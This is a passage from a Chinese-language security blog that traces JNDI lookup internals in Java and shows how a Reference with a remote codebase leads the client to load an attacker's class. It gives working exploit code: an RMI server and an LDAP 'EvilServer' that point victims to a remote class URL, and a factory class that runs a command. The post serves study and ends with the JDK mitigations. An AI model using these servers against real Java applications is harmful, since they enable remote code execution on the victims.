+<p>进入getRegistry</p>
+<p><img src="/2026/04/01/JNDI/image-20260331143236108.png" alt="image-20260331143236108"></p>
+<p>会去查找rmi的注册中心并返回</p>
+<p><img src="/2026/04/01/JNDI/image-20260331143304193.png" alt="image-20260331143304193"></p>
+<p>后面通过createproxy创建一个registImpl_stub返回回去 和rmi查找注册中心一样</p>
+<p><img src="/2026/04/01/JNDI/image-20260331143417720.png" alt="image-20260331143417720"></p>
+<p><img src="/2026/04/01/JNDI/image-20260331143635105.png" alt="image-20260331143635105"></p>
+<p>配置注册中心上下文</p>
+<p><img src="/2026/04/01/JNDI/image-20260331143711958.png" alt="image-20260331143711958"></p>
+<p>注册中心上下文搞好了 开始进入ResolveResult</p>
+<p>var15是注册中心上下文 var13是远程对象的名字</p>
+<p><img src="/2026/04/01/JNDI/image-20260331143817955.png" alt="image-20260331143817955"></p>
+<p>进入构造器 跟进setRemainingName</p>
+<p><img src="/2026/04/01/JNDI/image-20260331143902052.png" alt="image-20260331143902052"></p>
+<p>这里将远程对象的名字赋给 remainingName</p>
+<p><img src="/2026/04/01/JNDI/image-20260331144015770.png" alt="image-20260331144015770"></p>
+<p>回到lookup 进入getResolvedObj</p>
+<p><img src="/2026/04/01/JNDI/image-20260331144051292.png" alt="image-20260331144051292"></p>
+<p>就是把刚刚的注册中心上下文赋给它</p>
+<p>进入注册中心上下文的lookup</p>
+<p><img src="/2026/04/01/JNDI/image-20260331144111965.png" alt="image-20260331144111965"></p>
+<p><img src="/2026/04/01/JNDI/image-20260331144211211.png" alt="image-20260331144211211"></p>
+<p>开始调用registryImpl_stub的lookup和rmi的一样</p>
+<p>后续也是new一个RemoteCall 然后开始请求 </p>
+<p>最终也是收到一个动态代理对象</p>
+<p><img src="/2026/04/01/JNDI/image-20260331144545356.png" alt="image-20260331144545356"></p>
+<hr>
+<h3 id="Reference对象的利用"><a href="#Reference对象的利用" class="headerlink" title="Reference对象的利用"></a>Reference对象的利用</h3><p>由于JNDI引入了Reference对象 我们可以利用这个让lookup对象的那一端自动的下载并加载类</p>
+<p>但是RMI中并没有Reference对象 需要使用ReferenceWrapper包装器 将一个Reference对象包装一下可以绑定在注册中心上</p>
+<p>看看ReferenceWrapper类</p>
+<p><img src="/2026/04/01/JNDI/image-20260331145247912.png" alt="image-20260331145247912"></p>
+<p><img src="/2026/04/01/JNDI/image-20260331145314118.png" alt="image-20260331145314118"></p>
+<p>ReferenceWrapper类继承自RemoteReference接口 -&gt; RemoteReference接口又继承了Remote接口</p>
+<p>通过ReferenceWrapper包装的Reference对象自然也就继承Remote接口 此时就可以绑定在注册中心上</p>
+<p>跟进一手lookup </p>
+<p><img src="/2026/04/01/JNDI/image-20260402113004812.png" alt="image-20260402113004812"></p>
+<p>我们先跳过前面部分 </p>
+<p>直接到<strong>RegistryContext的lookup</strong>中看看</p>
+<p>var2会获得RegistryImpl_stub.lookup()查找的对象</p>
+<p>这里就是我们设置的ReferenceWrapper_Stub对象</p>
+<p><img src="/2026/04/01/JNDI/image-20260402112555460.png" alt="image-20260402112555460"></p>
+<p>之后就要开始通过这个 ReferenceWrapper_Stub -&gt; Reference -&gt; 恶意对象</p>
+<p>跟进decodeObject()</p>
+<p><img src="/2026/04/01/JNDI/image-20260402113102563.png" alt="image-20260402113102563"></p>
+<p>检测是否是RemoteReference</p>
+<p>如果是就会获取其中的Reference对象</p>
+<p><img src="/2026/04/01/JNDI/image-20260402113146244.png" alt="image-20260402113146244"></p>
+<p>这里会调用super.ref.invok 猜测就是根据Reference对象中包装好的工厂类地址去下载这个工厂类对象</p>
+<p><img src="/2026/04/01/JNDI/image-20260402113629691.png" alt="image-20260402113629691"></p>
+<p>到了这里 var11已经就是Reference对象了 </p>
+<p>跟进unmarshalValue</p>
+<p><img src="/2026/04/01/JNDI/image-20260402113836164.png" alt="image-20260402113836164"></p>
+<p>通过readObject 可以得到最终的Reference对象中的信息</p>
+<p><img src="/2026/04/01/JNDI/image-20260402113926578.png" alt="image-20260402113926578"></p>
+<p>回到decodeObject</p>
+<p><img src="/2026/04/01/JNDI/image-20260402114018032.png" alt="image-20260402114018032"></p>
+<p>注意一下<strong>NamingManager.getObjectInstance</strong></p>
+<p><img src="/2026/04/01/JNDI/image-20260402114229466.png" alt="image-20260402114229466"></p>
+<p>上面会有一些列的检测 到了这里就开始获取工厂类了</p>
+<p>跟进<strong>getObjectFactoryFromReference()</strong></p>
+<p><img src="/2026/04/01/JNDI/image-20260402114458897.png" alt="image-20260402114458897"></p>
+<p>通过刚刚获得的工厂类名 开始加载工厂类了</p>
+<p><img src="/2026/04/01/JNDI/image-20260402114905401.png" alt="image-20260402114905401"></p>
+<p>最终clas返回null</p>
+<p>是因为这里的loadclass 是尝试加载本地的类 而且codebase也没填入 显然本地是没有的 所以得通过<strong>其他的类加载器</strong>去加载</p>
+<p>通过调用ref.getFactoryClassLocation() 获取我们设置的工厂类的url</p>
+<p><img src="/2026/04/01/JNDI/image-20260402115041612.png" alt="image-20260402115041612"></p>
+<p><img src="/2026/04/01/JNDI/image-20260402115256083.png" alt="image-20260402115256083"></p>
+<p>跟进一下下面的loadClass</p>
+<p><img src="/2026/04/01/JNDI/image-20260402115456823.png" alt="image-20260402115456823"></p>
+<p>这里的构造器 就是直接使用URLClassLoader类加载器</p>
+<p>获取URLClassLoader实例 也把刚刚的codebase塞进去了</p>
+<p>最后来到这个本地forName0</p>
+<p><img src="/2026/04/01/JNDI/image-20260402115613648.png" alt="image-20260402115613648"></p>
+<p>调用完之后就成功下载并加载我们的恶意类了</p>
+<p><img src="/2026/04/01/JNDI/image-20260402115736649.png" alt="image-20260402115736649"></p>
+<p>栈帧中可以看到加载的Calc 与 http请求的响应信息</p>
+<p>之后就是成功触发</p>
+<p>也关注一下http服务的情况</p>
+<h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIclient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> context.lookup(<span class="string">&quot;rmi://10.68.0.136:1234/demo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span>  <span class="variable">RmiHost</span> <span class="operator">=</span> <span class="string">&quot;10.68.0.136&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span>  <span class="variable">RmiPort</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RmiUrl</span> <span class="operator">=</span> <span class="string">&quot;rmi://&quot;</span> + RmiHost + <span class="string">&quot;:&quot;</span> + RmiPort + <span class="string">&quot;/demo&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(RmiPort);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;eval&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="string">&quot;eval&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://10.68.0.136:8000/&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(classname,factory,url);</span><br><span class="line"></span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//RmiInterfaceImpl rmiInterfaceimpl = new RmiInterfaceImpl();</span></span><br><span class="line"></span><br><span class="line">            Naming.bind(RmiUrl,wrapper);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;RMI服务正在启动&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">eval</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                                    Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>LADP + JNDI</p>
+<p>LDAP也支持Reference</p>
+<p>引用这位师傅的代码</p>
+<p><a target="_blank" rel="noopener" href="https://nivi4.notion.site/Java-JNDI-ddd6c46c271545598180799ab255e09a#f476faa72703447c869106714302939c">JNDI</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi.ldapAttack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8888/#NIVIA&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;nivia&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="JNDI-RMI-Reference限制"><a href="#JNDI-RMI-Reference限制" class="headerlink" title="JNDI_RMI_Reference限制"></a>JNDI_RMI_Reference限制</h2><p>在<strong>JDK 6u132, JDK 7u122, JDK 8u113</strong>之后Java限制了通过RMI远程加载Reference工厂类。</p>
+<p><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  默认值变为false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类</p>
+<h2 id="JNDI-LDAP-Reference限制"><a href="#JNDI-LDAP-Reference限制" class="headerlink" title="JNDI_LDAP_Reference限制"></a>JNDI_LDAP_Reference限制</h2><p>在JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性的默认值同样被修改为了false，即默认不允许通过LDAP从远程的Codebase加载Reference工厂类</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JNDI/" rel="tag" title="JNDI">JNDI</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/java/" rel="tag" title="java">java</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%94%BB%E5%87%BB%E9%9D%A2/" rel="tag" title="攻击面">攻击面</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86/" rel="tag" title="知识">知识</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/covers/80524512_p0.png" data-sizes="auto" alt="JDWP" class="lazyload">
+        
+      
+      <a href="/2026/03/27/JDWP/" aria-label="后一篇: JDWP"  title="后一篇: JDWP"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          JDWP
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="gitalk">
+              <span>gitalk</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment gitalk-comment" data-aos="fade-up"
+          id="gitalk-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2025-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      S@Ku_yA
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        37.9k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:53
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI"><span class="toc-number">1.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.0.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1-%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.0.2.</span> <span class="toc-text">命名服务&#x2F;目录服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">简单使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83API"><span class="toc-number">1.2.1.</span> <span class="toc-text">核心API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">初始化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.3.</span> <span class="toc-text">查找对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">Reference对象的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-RMI-Reference%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">JNDI_RMI_Reference限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-LDAP-Reference%E9%99%90%E5%88%B6"><span class="toc-number">1.4.</span> <span class="toc-text">JNDI_LDAP_Reference限制</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">34</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
